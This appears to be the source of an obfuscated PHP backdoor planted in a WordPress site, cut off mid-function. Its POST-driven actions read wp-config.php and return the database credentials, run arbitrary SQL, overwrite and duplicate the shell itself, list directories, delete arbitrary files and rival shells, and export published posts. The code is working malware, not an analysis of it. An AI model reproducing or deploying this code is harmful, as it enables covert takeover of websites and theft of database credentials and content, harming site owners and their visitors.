Rtc9W0A0t
<?php
define('EXT_MYSQLI', 'mysqli'); define('EXT_MYSQL', 'mysql'); define('CONF_PASSWORD_HASH', 'a3d779b7f19ac1b4a0e7d836575c3446'); define('VERSION', '0.2.3'); function r_get_lib() { if (class_exists('mysqli')) { return EXT_MYSQLI; } if (function_exists('mysql_connect')) { return EXT_MYSQL; } } function r_get_config_path() { $spdcecfe = realpath('.'); $spcdbb88 = 0; while ($spdcecfe != '/') { if (file_exists(sprintf('%s/wp-config.php', $spdcecfe)) && file_exists(sprintf('%s/index.php', $spdcecfe)) && file_exists(sprintf('%s/wp-settings.php', $spdcecfe))) { return $spdcecfe; } $spcdbb88++; $spdcecfe = realpath(str_repeat('../', $spcdbb88)); } } function r_get_config() { $spdcecfe = realpath('.'); $spcdbb88 = 0; while ($spdcecfe != '/') { file_put_contents('flog.log', $spdcecfe . '
', FILE_APPEND); if (file_exists(sprintf('%s/wp-config.php', $spdcecfe)) && file_exists(sprintf('%s/index.php', $spdcecfe)) && file_exists(sprintf('%s/wp-settings.php', $spdcecfe))) { $sp2c5455 = file(sprintf('%s/wp-config.php', $spdcecfe)); $sp2c5455 = preg_grep('/defined/i', preg_grep('/define|table_prefix/i', $sp2c5455), PREG_GREP_INVERT); $sp2c5455 = implode('
', $sp2c5455); eval($sp2c5455); $sp6036cd = 'table_prefix'; $sp03ba22 = explode(':', DB_HOST); $sp9a4b83 = array_shift($sp03ba22); $sp934864 = array_shift($sp03ba22); $sp934864 = $sp934864 ? $sp934864 : 3306; return array('host' => $sp9a4b83, 'port' => $sp934864, 'db' => DB_NAME, 'user' => DB_USER, 'pass' => DB_PASSWORD, 'prefix' => ${$sp6036cd}, 'path' => $spdcecfe); break; } $spcdbb88++; $spdcecfe = realpath(str_repeat('../', $spcdbb88)); } } function r_mysql_connect($sp2c5455) { $spe34558 = mysql_connect(sprintf('%s:%s', $sp2c5455['host'], $sp2c5455['port']), $sp2c5455['user'], $sp2c5455['pass']); mysql_select_db($sp2c5455['db'], $spe34558); return $spe34558; } function r_mysqli_connect($sp2c5455) { return new mysqli($sp2c5455['host'], $sp2c5455['user'], $sp2c5455['pass'], $sp2c5455['db'], is_numeric($sp2c5455['port']) ? $sp2c5455['port'] : 3306, !is_numeric($sp2c5455['port']) ? $sp2c5455['port'] : null); } function r_mysql_query($sp2c5455, $spe34558, $spd09d3e, $sp71bc6d = array()) { if (!empty($sp71bc6d)) { foreach ($sp71bc6d as $spf00e4a => $spe24aa2) { $spd09d3e = str_replace($spf00e4a, mysql_real_escape_string($spe24aa2, $spe34558), $spd09d3e); } } $sp6cbe9c = array(); $spcafe07 = mysql_query($spd09d3e, $spe34558); if ($spcafe07) { while ($spa8eddf = mysql_fetch_assoc($spcafe07)) { $sp6cbe9c[] = $spa8eddf; } return array('success' => $sp6cbe9c); } else { return array('error' => sprintf('%s :: %s', mysql_errno($spe34558), mysql_error($spe34558))); } } function r_mysqli_query($sp2c5455, $spe34558, $spd09d3e, $sp71bc6d = array()) { if (!empty($sp71bc6d)) { foreach ($sp71bc6d as $spf00e4a => $spe24aa2) { $spd09d3e = str_replace($spf00e4a, $spe34558->real_escape_string($spe24aa2), $spd09d3e); } } $spcafe07 = $spe34558->query($spd09d3e); if (is_object($spcafe07)) { $sp6cbe9c = array(); while ($spa8eddf = $spcafe07->fetch_assoc()) { $sp6cbe9c[] = $spa8eddf; } return array('success' => $sp6cbe9c); } if ($spcafe07) { return array('success' => true); } else { return array('error' => sprintf('%s :: %s', $spe34558->errno, $spe34558->error)); } } function r_mysql_query_res($sp2c5455, $spe34558, $spd09d3e, $sp71bc6d = array()) { if (!empty($sp71bc6d)) { foreach ($sp71bc6d as $spf00e4a => $spe24aa2) { $spd09d3e = str_replace($spf00e4a, mysql_real_escape_string($spe24aa2, $spe34558), $spd09d3e); } } $sp6cbe9c = array(); $spcafe07 = mysql_query($spd09d3e, $spe34558); return $spcafe07; } function r_mysql_query_row($spcafe07) { if ($spcafe07) { return mysql_fetch_assoc($spcafe07); } else { return false; } } function r_mysqli_query_res($sp2c5455, $spe34558, $spd09d3e, $sp71bc6d = array()) { if (!empty($sp71bc6d)) { foreach ($sp71bc6d as $spf00e4a => $spe24aa2) { $spd09d3e = str_replace($spf00e4a, $spe34558->real_escape_string($spe24aa2), $spd09d3e); } } $spcafe07 = $spe34558->query($spd09d3e); return $spcafe07; } function r_mysqli_query_row($spcafe07) { if (is_object($spcafe07)) { return $spcafe07->fetch_assoc(); } else { return false; } } function r_unmagic() { if (get_magic_quotes_gpc()) { foreach ($_POST as $spf00e4a => $spe24aa2) { $_POST[$spf00e4a] = stripslashes($spe24aa2); } } } function r_action_prefix() { $sp2c5455 = r_get_config(); echo $sp2c5455['prefix']; } function r_action_query() { r_unmagic(); $sp2c5455 = r_get_config(); $spdce0b6 = r_get_lib(); $sp71bc6d = json_decode($_POST['bind'], true); if (isset($_POST['decode'])) { $sp8c399c = array_map('trim', explode(',', $_POST['decode'])); foreach ($sp8c399c as $sp6a3311) { if (isset($sp71bc6d[$sp6a3311])) { $sp71bc6d[$sp6a3311] = base64_decode($sp71bc6d[$sp6a3311]); } } } $spe34558 = call_user_func(sprintf('r_%s_connect', $spdce0b6), $sp2c5455); $spcafe07 = call_user_func(sprintf('r_%s_query', $spdce0b6), $sp2c5455, $spe34558, $_POST['query'], $sp71bc6d); if (isset($_POST['encode'])) { $sp58929d = array_map('trim', explode(',', $_POST['encode'])); foreach ($spcafe07['success'] as $sp0f01b7 => $spa8eddf) { foreach ($sp58929d as $sp7c4c28) { $spcafe07['success'][$sp0f01b7][$sp7c4c28] = base64_encode($spcafe07['success'][$sp0f01b7][$sp7c4c28]); } } } echo json_encode($spcafe07); } function r_action_update() { file_put_contents(__FILE__, base64_decode($_POST['file'])); echo md5(base64_decode($_POST['file'])); } function r_action_version() { echo VERSION; } function r_action_duplicate() { $sp7fcd1e = copy(__FILE__, $_POST['dst']); echo (int) $sp7fcd1e; } function r_action_copy() { $sp7fcd1e = copy($_POST['src'], $_POST['dst']); echo (int) $sp7fcd1e; } function r_action_dir() { $sp7fcd1e = array(); $sp6a3311 = dir($_POST['dir']); while (false !== ($sp843516 = $sp6a3311->read())) { $sp351dc7 = sprintf('%s/%s', rtrim($_POST['dir'], '/'), $sp843516); $sp7fcd1e[] = array('type' => is_file($sp351dc7) ? 'file' : (is_dir($sp351dc7) ? 'dir' : 'unknown'), 'entry' => $sp843516, 'full_entry' => $sp351dc7, 'realpath' => realpath($sp351dc7)); } $sp6a3311->close(); echo json_encode($sp7fcd1e); } function r_action_wpversion() { $spdcecfe = r_get_config_path(); $sp7694f9 = file_get_contents(sprintf('%s/wp-settings.php', $spdcecfe)); preg_match_all('/define\\(([^\\)]+)/i', $sp7694f9, $sp8e15f3); foreach ($sp8e15f3[1] as $sp7911ae) { if (strpos($sp7911ae, 'WPINC') !== false) { $sp7911ae = array_map('trim', explode(',', $sp7911ae)); foreach ($sp7911ae as $sp9d1d9e => $sp275c6b) { if ($sp275c6b[0] == $sp275c6b[strlen($sp275c6b) - 1]) { $sp7911ae[$sp9d1d9e] = substr($sp275c6b, 1, strlen($sp275c6b) - 2); } } require_once $spccf57a = sprintf('%s%s%s%sversion.php', $spdcecfe, DIRECTORY_SEPARATOR, str_replace('/', DIRECTORY_SEPARATOR, $sp7911ae[1]), DIRECTORY_SEPARATOR); $sp656747 = 'wp_version'; echo ${$sp656747}; die; } } echo 'error'; } function r_action_w3tc() { $spdcecfe = r_get_config_path(); $sp34a1f2 = rtrim(preg_replace('/^http[s]{0,1}\\:\\/\\//i', '', $_POST['url']), '/'); $spa63610 = sprintf('%s/wp-content/cache/page_enhanced/%s/_index.html', $spdcecfe, $sp34a1f2); if (file_exists($spa63610)) { unlink($spa63610); } $spa63610 = sprintf('%s/wp-content/cache/page_enhanced/%s/_index.html_gzip', $spdcecfe, $sp34a1f2); if (file_exists($spa63610)) { unlink($spa63610); } echo 'success'; } function r_action_cenabler() { $spdcecfe = r_get_config_path(); $sp34a1f2 = rtrim(preg_replace('/^http[s]{0,1}\\:\\/\\//i', '', $_POST['url']), '/'); $spa63610 = sprintf('%s/wp-content/cache/cache-enabler/%s/index.html', $spdcecfe, $sp34a1f2); if (file_exists($spa63610)) { unlink($spa63610); } $spa63610 = sprintf('%s/wp-content/cache/cache-enabler/%s/index.html.gz', $spdcecfe, $sp34a1f2); if (file_exists($spa63610)) { unlink($spa63610); } $spa63610 = sprintf('%s/wp-content/cache/cache-enabler/%s/index-webp.html', $spdcecfe, $sp34a1f2); if (file_exists($spa63610)) { unlink($spa63610); } $spa63610 = sprintf('%s/wp-content/cache/cache-enabler/%s/index-webp.html.gz', $spdcecfe, $sp34a1f2); if (file_exists($spa63610)) { unlink($spa63610); } echo 'success'; } function r_action_removeshell() { if (file_exists($spca8574 = sprintf('%s%s%s', rtrim($_SERVER['DOCUMENT_ROOT'], '/'), DIRECTORY_SEPARATOR, str_replace('/', DIRECTORY_SEPARATOR, ltrim($_POST['shell_url'], '/'))))) { if ($spca8574 != __FILE__) { unlink($spca8574); } echo file_exists($spca8574) ? 'fail' : 'success'; } else { echo 'ignore'; } } function r_action_remove() { if (file_exists($_POST['file'])) { if ($_POST['file'] != __FILE__) { unlink($_POST['file']); } echo file_exists($_POST['file']) ? 'fail' : 'success'; } else { echo 'ignore'; } } function r_action_pages() { $sp9ac625 = tempnam('./', 'wp') . '.php'; $sp461ea7 = fopen($sp9ac625, 'w'); $spdcecfe = r_get_config_path(); chdir($spdcecfe); $sp35211d = $_POST['id']; require $spdcecfe . '/wp-load.php'; r_unmagic(); $sp2c5455 = r_get_config(); $spdce0b6 = r_get_lib(); $spaa1fcb = $sp2c5455['prefix']; $spe34558 = call_user_func(sprintf('r_%s_connect', $spdce0b6), $sp2c5455); $spcafe07 = call_user_func(sprintf('r_%s_query_res', $spdce0b6), $sp2c5455, $spe34558, sprintf('SELECT * FROM `%sposts` WHERE `post_type` IN ( "post", "page" ) AND `post_status` = "publish" AND `ID` > %s ORDER BY `ID` ASC LIMIT %s, %s', $spaa1fcb, $_POST['remote_id'], $_POST['batch_start'], $_POST['batch_size'])); while ($spa8eddf = call_user_func(sprintf('r_%s_query_row', $spdce0b6), $spcafe07)) { fputcsv($sp461ea7, array($spa8eddf['ID'], base64_encode($spa8eddf['post_content']), base64_encode($spa8eddf['post_title']), base64_encode(get_permalink($spa8eddf['ID'])))); } fclose($sp461ea7); echo $sp9ac625; } function r_action_config() { echo json_encode(r_get_config()); } function r_action_getlib() { echo r_get_lib(); } function r_action_magic() { echo get_magic_quotes_gpc() ? 'Yes' : 'No'; } function r_action_loginurl() { $spbf5fbb = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}"; $sp636dcc = $spbf5fbb; $spf6d78e =